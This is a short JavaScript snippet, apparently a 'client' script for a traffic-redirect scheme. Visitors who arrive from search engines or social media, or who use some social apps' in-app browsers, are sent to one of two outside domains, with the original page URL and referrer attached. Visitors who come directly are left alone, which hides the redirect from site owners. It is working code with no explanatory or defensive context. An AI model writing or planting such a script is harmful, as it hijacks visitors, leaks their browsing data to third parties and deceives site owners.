var ars = rChoice([
	'https://www.soalkunci.xyz/',
	'https://ngeblog.eu.org/',
	]);

function rChoice(arr) {
return arr[Math.floor(arr.length * Math.random())];
}

//Code arsae client javascript
if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
